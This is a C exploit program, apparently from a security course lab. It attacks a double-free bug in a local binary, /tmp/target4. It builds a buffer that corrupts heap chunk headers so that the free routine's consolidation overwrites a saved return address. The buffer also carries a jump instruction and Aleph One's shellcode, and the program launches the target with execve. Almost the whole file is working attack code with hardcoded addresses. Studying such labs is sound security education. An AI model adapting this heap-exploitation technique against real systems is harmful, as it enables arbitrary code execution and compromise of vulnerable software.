#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"
#define EGG_SIZE 1024

/* 
 * Main idea of exploit:
 *     This double free exploit. 
 *
 *     The code in target4.c allocates a 1024 byte buffer for 'p'
 *     on top of a previously freed 300 byte buffer allocated for 'q'.
 *     It then double frees 'q'. The 1024 buffer will contain our
 *     shellcode and will overwrite some of the headers for 'q'
 *     such that when the second free for 'q' is called the 
 *     consolidation operations of tfree will overwrite the
 *     saved eip for foo (retLoc) with the start of the buffer 
 *     (retAddr). This is the basic idea modulo some important 
 *     implementation details.
 */

int main(void)
{
  char *args[3];
  char *env[1];
  long retAddr, retLoc, jumpInstruction;
  char egg[EGG_SIZE]; /* string containing exploit code */
  
  retAddr = 0x08049C68; /* start address of buffer in heap that contains shellcode */
  retLoc = 0xBFFFFA3C; /* address of saved eip for foo function call frame */
  jumpInstruction = 0xFFFF06EB; 
  
  /* make sure no null bytes in the middle of egg */
  memset (egg, 1, EGG_SIZE); 
  
  /* These next 8 bytes overwrite the header for 'q' such that
     upon double freeing 'q' the saved eip for foo will
     point to the start of the malicious buffer */
  memcpy (&egg[504], &retAddr, 4);
  memcpy (&egg[508], &retLoc, 4);

  /* Jump instruction at the start of buffer that jumps to 
     start of shellcode (we need this since the double free
     will mess up the first bytes of buffer as a by-product). */ 
  memcpy (egg, &jumpInstruction, 2); 
  
  /* Starting at the 9th byte, fill the exploit string with
     Aleph One's shellcode */
  memcpy (egg + 8, shellcode, strlen (shellcode));
  
  
  egg[EGG_SIZE - 1] = 0; /* null terminate exploit string for safety */
  
  args[0] = TARGET; args[1] = egg; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve (TARGET, args, env))
    fprintf (stderr, "execve failed.\n");

  return 0;
}
